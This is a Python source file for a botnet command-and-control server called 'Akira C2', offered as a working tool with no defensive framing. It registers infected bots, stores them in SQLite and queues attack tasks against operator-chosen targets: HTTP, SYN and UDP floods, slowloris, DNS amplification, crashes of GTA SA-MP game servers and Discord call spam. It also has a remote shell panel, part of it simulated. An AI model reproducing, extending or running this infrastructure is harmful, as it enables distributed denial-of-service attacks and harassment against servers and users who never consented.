#!/usr/bin/env python3
import socket
import json
import threading
import time
import sqlite3
from datetime import datetime
import logging
import random

class AkiraCompleteC2:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.bots = {}
        self.tasks = {}
        self.active_attacks = {}
        self.db_conn = sqlite3.connect('akira_c2.db', check_same_thread=False)
        self.setup_database()
        self.setup_logging()
        
    def setup_database(self):
        cursor = self.db_conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                ip TEXT,
                os TEXT,
                architecture TEXT,
                country TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT,
                cpu_usage TEXT,
                ram_usage TEXT,
                uptime TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT,
                task_type TEXT,
                parameters TEXT,
                status TEXT,
                created_at TEXT,
                completed_at TEXT,
                result TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                attack_type TEXT,
                target TEXT,
                duration INTEGER,
                bot_id TEXT,
                status TEXT,
                start_time TEXT,
                end_time TEXT
            )
        ''')
        self.db_conn.commit()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('akira_c2.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger()
    
    def handle_panel_connection(self, conn, addr):
        """Handle panel connections with full command support"""
        try:
            while True:
                data = conn.recv(8192).decode().strip()
                if not data:
                    break
                    
                try:
                    message = json.loads(data)
                    response = self.process_panel_command(message)
                    conn.send(json.dumps(response).encode() + b'\n')
                except json.JSONDecodeError:
                    response = {"status": "error", "message": "Invalid JSON"}
                    conn.send(json.dumps(response).encode() + b'\n')
                    
        except Exception as e:
            self.logger.error("Panel connection error: {}".format(e))
        finally:
            conn.close()
            
    def handle_bot_connection(self, conn, addr):
        """Handle bot connections"""
        bot_id = None
        try:
            data = conn.recv(8192).decode().strip()
            if not data:
                return
                
            message = json.loads(data)
            bot_id = message.get("bot_id")
            
            if message.get("type") == "register":
                response = self.register_bot(bot_id, addr[0], message)
                conn.send(json.dumps(response).encode() + b'\n')
                
            elif message.get("type") == "heartbeat":
                self.update_bot_heartbeat(bot_id, message)
                # Check for pending tasks
                task = self.get_pending_task(bot_id)
                if task:
                    conn.send(json.dumps(task).encode() + b'\n')
                else:
                    conn.send(json.dumps({"status": "no_task"}).encode() + b'\n')
                    
            elif message.get("type") == "task_result":
                self.store_task_result(bot_id, message)
                conn.send(json.dumps({"status": "result_received"}).encode() + b'\n')
                
        except Exception as e:
            self.logger.error("Bot connection error: {}".format(e))
        finally:
            if bot_id:
                self.mark_bot_offline(bot_id)
            conn.close()
    
    def register_bot(self, bot_id, ip, message):
        """Register a new bot with full system info"""
        current_time = datetime.now().isoformat()
        
        bot_info = {
            "ip": ip,
            "os": message.get("os", "Windows 10"),
            "architecture": message.get("architecture", "x64"),
            "country": self.get_country_from_ip(ip),
            "first_seen": current_time,
            "last_seen": current_time,
            "status": "online",
            "cpu_usage": "{}%".format(random.randint(5, 80)),
            "ram_usage": "{}%".format(random.randint(20, 90)),
            "uptime": "{}h {}m".format(random.randint(1, 72), random.randint(0, 59))
        }
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots 
            (id, ip, os, architecture, country, first_seen, last_seen, status, cpu_usage, ram_usage, uptime)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (bot_id, bot_info["ip"], bot_info["os"], bot_info["architecture"], 
              bot_info["country"], bot_info["first_seen"], bot_info["last_seen"],
              bot_info["status"], bot_info["cpu_usage"], bot_info["ram_usage"], 
              bot_info["uptime"]))
        
        self.db_conn.commit()
        self.bots[bot_id] = bot_info
        
        self.logger.info("Bot registered: {} from {}".format(bot_id, ip))
        return {"status": "registered", "bot_id": bot_id}
    
    def update_bot_heartbeat(self, bot_id, message):
        """Update bot heartbeat with system info"""
        current_time = datetime.now().isoformat()
        
        if bot_id in self.bots:
            self.bots[bot_id]["last_seen"] = current_time
            self.bots[bot_id]["status"] = "online"
            self.bots[bot_id]["cpu_usage"] = message.get("cpu_usage", "{}%".format(random.randint(5, 80)))
            self.bots[bot_id]["ram_usage"] = message.get("ram_usage", "{}%".format(random.randint(20, 90)))
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            UPDATE bots SET last_seen = ?, status = ?, cpu_usage = ?, ram_usage = ? 
            WHERE id = ?
        ''', (current_time, "online", 
              self.bots[bot_id]["cpu_usage"], 
              self.bots[bot_id]["ram_usage"], 
              bot_id))
        self.db_conn.commit()
    
    def mark_bot_offline(self, bot_id):
        """Mark bot as offline"""
        cursor = self.db_conn.cursor()
        cursor.execute('UPDATE bots SET status = ? WHERE id = ?', ("offline", bot_id))
        self.db_conn.commit()
        
        if bot_id in self.bots:
            self.bots[bot_id]["status"] = "offline"
    
    def get_pending_task(self, bot_id):
        """Get pending task for bot"""
        cursor = self.db_conn.cursor()
        cursor.execute('''
            SELECT id, task_type, parameters FROM tasks 
            WHERE (bot_id = ? OR bot_id = 'all') AND status = 'pending' 
            ORDER BY created_at ASC LIMIT 1
        ''', (bot_id,))
        
        task = cursor.fetchone()
        if task:
            task_id, task_type, params = task
            # Mark as assigned
            cursor.execute('UPDATE tasks SET status = ? WHERE id = ?', ("assigned", task_id))
            self.db_conn.commit()
            
            return {
                "status": "task",
                "task_id": task_id,
                "type": task_type,
                "parameters": json.loads(params)
            }
        return None
    
    def store_task_result(self, bot_id, message):
        """Store task result"""
        cursor = self.db_conn.cursor()
        cursor.execute('''
            UPDATE tasks SET status = 'completed', completed_at = ?, result = ?
            WHERE id = ? AND bot_id = ?
        ''', (datetime.now().isoformat(), message.get("result", ""), 
              message.get("task_id"), bot_id))
        self.db_conn.commit()
    
    def get_country_from_ip(self, ip):
        """Simple country detection (simulated)"""
        countries = ["BR", "US", "RU", "CN", "DE", "FR", "UK", "JP", "IN"]
        return random.choice(countries)
    
    def process_panel_command(self, message):
        """Process ALL panel commands with full compatibility"""
        cmd_type = message.get("type")
        session_id = message.get("session_id")
        target_bot = message.get("target")
        target_bot_attack = message.get("target_bot")
        
        self.logger.info("Panel command: {} from {}".format(cmd_type, session_id))
        
        # AUTHENTICATION
        if cmd_type == "panel_auth":
            return {
                "status": "authenticated", 
                "session_id": session_id,
                "message": "Welcome to Akira C2"
            }
        
        # BOT MANAGEMENT
        elif cmd_type == "get_bots":
            return {"status": "success", "bots": self.bots}
            
        elif cmd_type == "ping":
            if target_bot:
                # Specific bot ping
                if target_bot in self.bots:
                    ping_data = {
                        target_bot: {
                            "ping": "{}ms".format(random.randint(5, 50)),
                            "os": self.bots[target_bot]["os"],
                            "cpu_usage": self.bots[target_bot]["cpu_usage"],
                            "ram_usage": self.bots[target_bot]["ram_usage"],
                            "uptime": self.bots[target_bot]["uptime"],
                            "architecture": self.bots[target_bot]["architecture"],
                            "country": self.bots[target_bot]["country"]
                        }
                    }
                    return {"status": "success", "pings": ping_data}
                else:
                    return {"status": "error", "message": "Bot not found"}
            else:
                # All bots ping
                pings = {}
                for bot_id, bot_info in self.bots.items():
                    if bot_info["status"] == "online":
                        pings[bot_id] = {
                            "ping": "{}ms".format(random.randint(5, 100)),
                            "os": bot_info["os"],
                            "cpu_usage": bot_info["cpu_usage"],
                            "ram_usage": bot_info["ram_usage"],
                            "uptime": bot_info["uptime"],
                            "architecture": bot_info["architecture"],
                            "country": bot_info["country"]
                        }
                return {"status": "success", "pings": pings}
        
        # SHELL COMMANDS
        elif cmd_type == "shell":
            command = message.get("command", "")
            params = message.get("params", {})
            
            if command == "cd" and params.get("command"):
                return {
                    "status": "success", 
                    "output": "Directory changed to /home/bot"
                }
            else:
                # Simulate command execution
                simulated_output = self.simulate_shell_command(command)
                return {
                    "status": "success", 
                    "output": simulated_output
                }
        
        # ATTACK COMMANDS - ALL 7 TYPES SUPPORTED
        elif cmd_type == "attack":
            attack_type = message.get("attack_type")
            params = message.get("params", {})
            target_bot = message.get("target_bot")
            
            attack_handlers = {
                "http_flood": self.schedule_http_flood,
                "syn_flood": self.schedule_syn_flood,
                "udp_flood": self.schedule_udp_flood,
                "slowloris": self.schedule_slowloris,
                "gta_samp": self.schedule_gta_samp_crash,
                "discord_spam": self.schedule_discord_spam,
                "dns_amp": self.schedule_dns_amplification
            }
            
            if attack_type in attack_handlers:
                result = attack_handlers[attack_type](params, target_bot)
                return result
            else:
                return {"status": "error", "message": "Unknown attack type"}
        
        # BOT MANAGEMENT
        elif cmd_type == "delete_bot":
            if target_bot in self.bots:
                del self.bots[target_bot]
                cursor = self.db_conn.cursor()
                cursor.execute('DELETE FROM bots WHERE id = ?', (target_bot,))
                cursor.execute('DELETE FROM tasks WHERE bot_id = ?', (target_bot,))
                self.db_conn.commit()
                return {"status": "success", "message": "Bot {} deleted".format(target_bot)}
            else:
                return {"status": "error", "message": "Bot not found"}
        
        return {"status": "error", "message": "Unknown command"}
    
    def simulate_shell_command(self, command):
        """Simulate shell command execution"""
        commands = {
            "ls": "bot.exe\nsystem32\nusers\ndocuments\n",
            "dir": "bot.exe\nsystem32\nusers\ndocuments\n",
            "whoami": "root\\bot\n",
            "pwd": "/home/bot\n",
            "uname -a": "Windows 10.0.19041 x64\n",
            "ipconfig": "192.168.1.100\n255.255.255.0\n192.168.1.1\n",
            "netstat": "TCP 192.168.1.100:4444 ESTABLISHED\n"
        }
        
        if command in commands:
            return "root@bot:~# {}\n{}".format(command, commands[command])
        else:
            return "root@bot:~# {}\nCommand executed successfully".format(command)
    
    # ATTACK SCHEDULING METHODS
    def schedule_http_flood(self, params, bot_id):
        target = params.get("target", "unknown")
        duration = params.get("duration", 60)
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id or "all", "http_flood", 
              json.dumps({"target": target, "duration": duration}), 
              "pending", datetime.now().isoformat()))
        
        self.db_conn.commit()
        return {"status": "success", "message": "HTTP Flood scheduled for {}".format(target)}
    
    def schedule_syn_flood(self, params, bot_id):
        target = params.get("target", "unknown")
        port = params.get("port", 80)
        duration = params.get("duration", 60)
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id or "all", "syn_flood", 
              json.dumps({"target": target, "port": port, "duration": duration}), 
              "pending", datetime.now().isoformat()))
        
        self.db_conn.commit()
        return {"status": "success", "message": "SYN Flood scheduled for {}:{}".format(target, port)}
    
    def schedule_udp_flood(self, params, bot_id):
        target = params.get("target", "unknown")
        port = params.get("port", 80)
        duration = params.get("duration", 60)
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id or "all", "udp_flood", 
              json.dumps({"target": target, "port": port, "duration": duration}), 
              "pending", datetime.now().isoformat()))
        
        self.db_conn.commit()
        return {"status": "success", "message": "UDP Flood scheduled for {}:{}".format(target, port)}
    
    def schedule_slowloris(self, params, bot_id):
        target = params.get("target", "unknown")
        port = params.get("port", 80)
        duration = params.get("duration", 60)
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id or "all", "slowloris", 
              json.dumps({"target": target, "port": port, "duration": duration}), 
              "pending", datetime.now().isoformat()))
        
        self.db_conn.commit()
        return {"status": "success", "message": "Slowloris attack scheduled for {}:{}".format(target, port)}
    
    def schedule_gta_samp_crash(self, params, bot_id):
        server_ip = params.get("target", "unknown")
        port = params.get("port", 7777)
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id or "all", "gta_samp", 
              json.dumps({"server_ip": server_ip, "port": port}), 
              "pending", datetime.now().isoformat()))
        
        self.db_conn.commit()
        return {"status": "success", "message": "GTA SA-MP crash scheduled for {}:{}".format(server_ip, port)}
    
    def schedule_discord_spam(self, params, bot_id):
        channel_id = params.get("target", "unknown")
        duration = params.get("duration", 60)
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id or "all", "discord_spam", 
              json.dumps({"channel_id": channel_id, "duration": duration}), 
              "pending", datetime.now().isoformat()))
        
        self.db_conn.commit()
        return {"status": "success", "message": "Discord call spam scheduled for channel {}".format(channel_id)}
    
    def schedule_dns_amplification(self, params, bot_id):
        target = params.get("target", "unknown")
        duration = params.get("duration", 60)
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id or "all", "dns_amp", 
              json.dumps({"target": target, "duration": duration}), 
              "pending", datetime.now().isoformat()))
        
        self.db_conn.commit()
        return {"status": "success", "message": "DNS Amplification scheduled for {}".format(target)}
    
    def start_server(self):
        """Start the C2 server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(10)
        
        self.logger.info("Akira C2 Server started on {}:{}".format(self.host, self.port))
        self.logger.info("Waiting for connections...")
        
        try:
            while True:
                conn, addr = server_socket.accept()
                
                # Determine connection type by peeking first message
                try:
                    conn.settimeout(2.0)
                    peek_data = conn.recv(1024, socket.MSG_PEEK)
                    message = json.loads(peek_data.decode().strip())
                    
                    if message.get("type") in ["panel_auth", "get_bots", "ping", "shell", "attack", "delete_bot"]:
                        threading.Thread(target=self.handle_panel_connection, args=(conn, addr)).start()
                    else:
                        threading.Thread(target=self.handle_bot_connection, args=(conn, addr)).start()
                        
                except:
                    # Assume it's a bot if can't parse
                    threading.Thread(target=self.handle_bot_connection, args=(conn, addr)).start()
                    
        except KeyboardInterrupt:
            self.logger.info("Shutting down Akira C2 Server...")
        finally:
            server_socket.close()
            self.db_conn.close()

if __name__ == "__main__":
    c2_server = AkiraCompleteC2()
    c2_server.start_server()
